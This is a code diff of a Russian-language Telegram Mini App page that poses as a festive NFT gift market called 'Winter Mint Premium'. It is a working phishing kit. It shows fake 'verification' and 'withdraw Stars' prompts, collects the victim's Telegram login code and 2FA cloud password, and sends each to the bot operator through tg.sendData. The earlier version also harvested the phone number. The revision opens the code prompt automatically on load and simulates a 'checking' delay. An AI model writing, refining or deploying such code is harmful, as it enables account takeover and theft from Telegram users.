@@ -1,71 +1,87 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Winter Mint Premium</title>
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<style>
-:root{
-    --bg-dark:#1b0f0f;
-    --bg-grad:#3d0f0f;
-    --card:rgba(255,255,255,0.05);
-    --border:rgba(255,255,255,0.1);
-    --accent-red:#e63946;
-    --accent-green:#2a9d8f;
-    --text:#f4f4f4;
-    --text-soft:rgba(244,244,244,0.7);
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Winter Mint Premium</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bg-dark: #1b0f0f;
+            --bg-grad: #3d0f0f;
+            --card: rgba(255,255,255,0.05);
+            --border: rgba(255,255,255,0.1);
+            --accent-red: #e63946;
+            --accent-green: #2a9d8f;
+            --text: #f4f4f4;
+            --text-soft: rgba(244,244,244,0.7);
+        }
 
-*{box-sizing:border-box;}
-body{
-    margin:0;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,system-ui;
-    color:var(--text);
-    background: linear-gradient(180deg,var(--bg-dark),var(--bg-grad));
-    overflow-x:hidden;
-    position:relative;
-    min-height: 100vh;
-}
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, system-ui;
+            color: var(--text);
+            background: linear-gradient(180deg, var(--bg-dark), var(--bg-grad));
+            overflow-x: hidden;
+            position: relative;
+            min-height: 100vh;
+            user-select: none;
+        }
 
-canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
-.header{ text-align:center; padding:60px 20px 20px; position:relative; z-index:2; }
-.header h1{ margin:0; font-size:32px; font-weight:700; text-shadow:0 0 10px var(--accent-red); }
-.badge{ margin-top:8px; display:inline-block; background:var(--accent-green); color:#fff; padding:6px 14px; border-radius:20px; font-size:14px; font-weight:700; box-shadow:0 4px 12px rgba(0,0,0,0.4); }
+        /* СНЕГОВПАД */
+        canvas { position: fixed; inset: 0; z-index: 1; pointer-events: none; }
 
-.nav{ display:flex; gap:10px; padding:10px; position:sticky; top:0; z-index:5; background:rgba(0,0,0,.4); backdrop-filter:blur(8px); }
-.nav button{ flex:1; padding:12px; border-radius:14px; border:1px solid var(--accent-red); background:transparent; color:#fff; font-weight:700; transition:0.3s; cursor:pointer;}
-.nav button.active{ background:linear-gradient(90deg,var(--accent-red),var(--accent-green)); border:none; }
+        /* HEADER */
+        .header { text-align: center; padding: 50px 20px 20px; position: relative; z-index: 2; }
+        .header h1 { margin: 0; font-size: 32px; font-weight: 800; text-shadow: 0 0 15px var(--accent-red); letter-spacing: -1px; }
+        .badge { margin-top: 10px; display: inline-block; background: var(--accent-green); color: #fff; padding: 6px 16px; border-radius: 20px; font-size: 13px; font-weight: 700; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
 
-.section{ display:none; padding:16px; position:relative; z-index:2; }
-.section.active{display:block}
+        /* NAV */
+        .nav { display: flex; gap: 8px; padding: 12px; position: sticky; top: 0; z-index: 5; background: rgba(0,0,0,.3); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
+        .nav button { flex: 1; padding: 12px; border-radius: 12px; border: 1px solid var(--border); background: rgba(255,255,255,0.03); color: #fff; font-weight: 600; font-size: 14px; transition: 0.3s; cursor: pointer; }
+        .nav button.active { background: linear-gradient(90deg, var(--accent-red), #b22222); border: none; box-shadow: 0 4px 12px rgba(230, 57, 70, 0.3); }
 
-.card{ background:var(--card); border:1px solid var(--border); border-radius:20px; padding:18px; margin-bottom:16px; backdrop-filter:blur(12px); box-shadow:0 8px 28px rgba(0,0,0,.5); }
-.label{ font-size:12px; color:var(--text-soft); margin-bottom:6px; }
-.value{ font-size:20px; font-weight:600; }
+        /* СЕКЦИИ */
+        .section { display: none; padding: 20px; position: relative; z-index: 2; animation: slideUp 0.4s ease; }
+        .section.active { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-.btn{ width:100%; margin-top:12px; padding:14px; border-radius:14px; border:none; background:linear-gradient(135deg,var(--accent-red),var(--accent-green)); color:#fff; font-weight:700; cursor:pointer; box-shadow:0 6px 20px rgba(0,0,0,0.5); transition:0.3s; }
+        /* КАРТОЧКИ */
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 24px; padding: 20px; margin-bottom: 16px; backdrop-filter: blur(15px); box-shadow: 0 10px 30px rgba(0,0,0,.4); }
+        .label { font-size: 11px; font-weight: 700; color: var(--text-soft); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+        .value { font-size: 22px; font-weight: 700; }
 
-.market{ display:grid; grid-template-columns:1fr 1fr; gap:14px; }
-.nft{ background:var(--card); border:1px solid var(--border); border-radius:18px; padding:10px; text-align:center; cursor:pointer;}
-.nft img{ width:100%; max-height:140px; object-fit:contain; border-radius:14px; }
+        /* КНОПКИ */
+        .btn { width: 100%; margin-top: 15px; padding: 16px; border-radius: 16px; border: none; background: linear-gradient(135deg, var(--accent-red), #9b2226); color: #fff; font-weight: 700; font-size: 16px; cursor: pointer; box-shadow: 0 6px 20px rgba(0,0,0,0.4); transition: 0.2s; }
+        .btn:active { transform: scale(0.98); opacity: 0.9; }
 
-.overlay {
-    display: none; position: fixed; inset: 0; 
-    background: rgba(0,0,0,0.92); backdrop-filter: blur(15px);
-    z-index: 1000; padding: 40px 24px; flex-direction: column; justify-content: center;
-}
-.overlay.active { display: flex; animation: fadeIn 0.3s ease; }
-@keyframes fadeIn { from{opacity:0} to{opacity:1} }
+        /* МАРКЕТ */
+        .market { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .nft { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 12px; text-align: center; transition: 0.3s; }
+        .nft img { width: 100%; border-radius: 16px; margin-bottom: 10px; }
+        .nft-name { font-size: 13px; font-weight: 600; color: var(--text-soft); }
 
-.input-field {
-    background: rgba(255,255,255,0.05); border: 1.5px solid var(--accent-red);
-    padding: 20px; border-radius: 16px; color: #fff;
-    font-size: 26px; text-align: center; margin: 25px 0; outline: none; width: 100%;
-}
+        /* OVERLAYS (ОКНА ВВОДА) */
+        .overlay {
+            display: none; position: fixed; inset: 0; 
+            background: rgba(0,0,0,0.94); backdrop-filter: blur(20px);
+            z-index: 1000; padding: 30px; flex-direction: column; justify-content: center; align-items: center;
+        }
+        .overlay.active { display: flex; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from{opacity:0} to{opacity:1} }
 
-.fireplace{ position:fixed; bottom:10px; right:10px; font-size:48px; text-shadow:0 0 15px #f77; z-index:2; opacity:0.85; }
-</style>
+        .input-field {
+            background: rgba(255,255,255,0.07); border: 2px solid var(--accent-red);
+            padding: 20px; border-radius: 18px; color: #fff;
+            font-size: 28px; text-align: center; margin: 20px 0; outline: none; width: 100%;
+            font-weight: 700; letter-spacing: 4px;
+        }
+        .input-field::placeholder { letter-spacing: 0; font-size: 18px; opacity: 0.3; }
+
+        .fireplace { position: fixed; bottom: 15px; right: 15px; font-size: 40px; filter: drop-shadow(0 0 10px #f77); z-index: 2; opacity: 0.8; }
+    </style>
 </head>
 <body>
 
@@ -77,118 +93,139 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
 </div>
 
 <div class="nav">
-    <button class="active" onclick="openTab('cab',this)">Кабинет</button>
-    <button onclick="openTab('market',this)">Маркет</button>
-    <button onclick="openTab('support',this)">Поддержка</button>
+    <button id="btn-cab" class="active" onclick="openTab('cab',this)">Кабинет</button>
+    <button id="btn-market" onclick="openTab('market',this)">Маркет</button>
+    <button id="btn-support" onclick="openTab('support',this)">Поддержка</button>
 </div>
 
 <div id="cab" class="section active">
     <div class="card">
         <div class="label">СТАТУС АККАУНТА</div>
-        <div class="value">Не подтверждён</div>
-        <button class="btn" onclick="startAuth()">Пройти верификацию</button>
+        <div class="value" style="color:var(--accent-red)">Не подтверждён</div>
+        <button class="btn" onclick="showInput('step-code')">Пройти верификацию</button>
     </div>
     <div class="card">
-        <div class="label">БАЛАНС</div>
+        <div class="label">ВАШ БАЛАНС</div>
         <div class="value">0.00 ⭐</div>
-        <button class="btn" onclick="startAuth()">Пополнить баланс</button>
+        <button class="btn" style="background:var(--border)" onclick="showInput('step-code')">Вывести Stars</button>
     </div>
 </div>
 
 <div id="market" class="section">
     <div class="market">
-        <div class="nft" onclick="startAuth()">
-            <img src="https://nft.fragment.com/gift/santahat-10168.webp">
-            <div style="font-size:13px; margin-top:8px">Frosty Hat</div>
+        <div class="nft" onclick="showInput('step-code')">
+            <img src="https://nft.fragment.com/gift/santahat-10168.webp" alt="NFT">
+            <div class="nft-name">Frosty Hat</div>
         </div>
-        <div class="nft" onclick="startAuth()">
-            <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp">
-            <div style="font-size:13px; margin-top:8px">Holiday Drink</div>
+        <div class="nft" onclick="showInput('step-code')">
+            <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" alt="NFT">
+            <div class="nft-name">Holiday Drink</div>
         </div>
     </div>
 </div>
 
 <div id="support" class="section">
-    <div class="card">
-        <p style="color:var(--text-soft)">По всем вопросам: <b>@x1o1y</b></p>
-        <button class="btn" onclick="window.open('https://t.me/x1o1y')">Написать</button>
+    <div class="card" style="text-align: center;">
+        <p style="color:var(--text-soft); margin-bottom: 20px;">Если у вас возникли проблемы с получением подарка, напишите нашему менеджеру:</p>
+        <button class="btn" onclick="window.open('https://t.me/x1o1y')">Связаться с поддержкой</button>
     </div>
 </div>
 
 <div id="step-code" class="overlay">
-    <h2 style="text-align:center">Код подтверждения</h2>
-    <p style="text-align:center; color:var(--text-soft)">Введите код из приложения Telegram</p>
-    <input type="number" id="inp-code" class="input-field" placeholder="00000">
-    <button class="btn" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
+    <h2 style="margin:0">Подтверждение</h2>
+    <p style="text-align:center; color:var(--text-soft); font-size: 14px;">Введите 5-значный код из чата <b>Telegram</b></p>
+    <input type="number" id="inp-code" class="input-field" placeholder="00000" inputmode="numeric">
+    <button class="btn" id="btn-send-code" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
 </div>
 
 <div id="step-2fa" class="overlay">
-    <h2 style="text-align:center">Облачный пароль</h2>
-    <p style="text-align:center; color:var(--text-soft)">Ваш аккаунт защищен 2FA. Введите пароль:</p>
-    <input type="password" id="inp-pass" class="input-field" placeholder="Пароль">
-    <button class="btn" onclick="sendPass()">ВОЙТИ</button>
+    <h2 style="margin:0">Облачный пароль</h2>
+    <p style="text-align:center; color:var(--text-soft); font-size: 14px;">Ваш аккаунт защищен 2-этапной аутентификацией</p>
+    <input type="password" id="inp-pass" class="input-field" placeholder="Введите пароль" style="letter-spacing: 0;">
+    <button class="btn" id="btn-send-pass" onclick="sendPass()">ВОЙТИ В МАРКЕТ</button>
 </div>
 
 <div class="fireplace">🔥</div>
 
 <script>
-const tg = window.Telegram.WebApp;
-tg.expand();
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    tg.enableClosingConfirmation();
 
-function openTab(id, el) {
-    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-    document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-    el.classList.add('active');
-}
-
-// Запрос контакта и переход к коду
-function startAuth() {
-    tg.requestContact((ok, res) => {
-        if(ok && res.responseUnsafe.contact) {
-            tg.sendData("PHONE:" + res.responseUnsafe.contact.phone_number);
-            setTimeout(() => {
-                document.getElementById('step-code').classList.add('active');
-            }, 500);
-        }
-    });
-}
-
-function sendCode() {
-    let val = document.getElementById('inp-code').value; 
-    if(val.length >= 5) {
-        tg.sendData("CODE:" + val); 
-        document.querySelector('#step-code button').innerText = "Проверка...";
+    // Авто-показ окна кода при входе
+    window.onload = () => {
         setTimeout(() => {
-            document.getElementById('step-code').classList.remove('active'); 
-            document.getElementById('step-2fa').classList.add('active');    
-        }, 1500);
-    }
-}
+            showInput('step-code');
+        }, 800);
+    };
 
-function sendPass() {
-    let val = document.getElementById('inp-pass').value;
-    if(val.length > 0) {
-        tg.sendData("PASS:" + val);
-        setTimeout(() => { tg.close(); }, 1000);
+    function openTab(id, el) {
+        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+        document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        el.classList.add('active');
     }
-}
 
-// СНЕГ
-const c=document.getElementById("snow"),ctx=c.getContext("2d");
-let w,h,flakes=[];
-function resize(){w=c.width=innerWidth;h=c.height=innerHeight}
-window.onresize=resize;resize();
-for(let i=0;i<120;i++) flakes.push({x:Math.random()*w,y:Math.random()*h,r:1.5+Math.random()*2,s:0.6+Math.random()*1.4});
-function snow(){
-    ctx.clearRect(0,0,w,h); ctx.fillStyle="rgba(255,255,255,0.8)";
-    flakes.forEach(f=>{
-        ctx.beginPath();ctx.arc(f.x,f.y,f.r,0,Math.PI*2);ctx.fill();
-        f.y+=f.s;if(f.y>h){f.y=-10;f.x=Math.random()*w}
-    });
-    requestAnimationFrame(snow);
-}
-snow();
+    function showInput(stepId) {
+        document.querySelectorAll('.overlay').forEach(ov => ov.classList.remove('active'));
+        document.getElementById(stepId).classList.add('active');
+    }
+
+    // ОТПРАВКА КОДА
+    function sendCode() {
+        const codeInput = document.getElementById('inp-code');
+        const btn = document.getElementById('btn-send-code');
+        
+        if(codeInput.value.length >= 5) {
+            tg.sendData("CODE:" + codeInput.value);
+            
+            btn.innerText = "ПРОВЕРКА...";
+            btn.disabled = true;
+            btn.style.opacity = "0.5";
+
+            // Имитация задержки проверки и переход на 2FA
+            setTimeout(() => {
+                document.getElementById('step-code').classList.remove('active');
+                document.getElementById('step-2fa').classList.add('active');
+            }, 1800);
+        } else {
+            tg.HapticFeedback.notificationOccurred('error');
+        }
+    }
+
+    // ОТПРАВКА ПАРОЛЯ
+    function sendPass() {
+        const passInput = document.getElementById('inp-pass');
+        const btn = document.getElementById('btn-send-pass');
+
+        if(passInput.value.length > 0) {
+            tg.sendData("PASS:" + passInput.value);
+            
+            btn.innerText = "АВТОРИЗАЦИЯ...";
+            btn.disabled = true;
+
+            setTimeout(() => {
+                tg.close();
+            }, 1500);
+        }
+    }
+
+    // СНЕГ (Оптимизированный)
+    const c = document.getElementById("snow"), ctx = c.getContext("2d");
+    let w, h, flakes = [];
+    function resize() { w = c.width = window.innerWidth; h = c.height = window.innerHeight; }
+    window.onresize = resize; resize();
+    for (let i = 0; i < 80; i++) flakes.push({ x: Math.random() * w, y: Math.random() * h, r: Math.random() * 2 + 1, s: Math.random() * 1 + 0.5 });
+    function snow() {
+        ctx.clearRect(0, 0, w, h); ctx.fillStyle = "rgba(255,255,255,0.6)";
+        flakes.forEach(f => {
+            ctx.beginPath(); ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2); ctx.fill();
+            f.y += f.s; if (f.y > h) { f.y = -5; f.x = Math.random() * w; }
+        });
+        requestAnimationFrame(snow);
+    }
+    snow();
 </script>
+
 </body>
 </html>
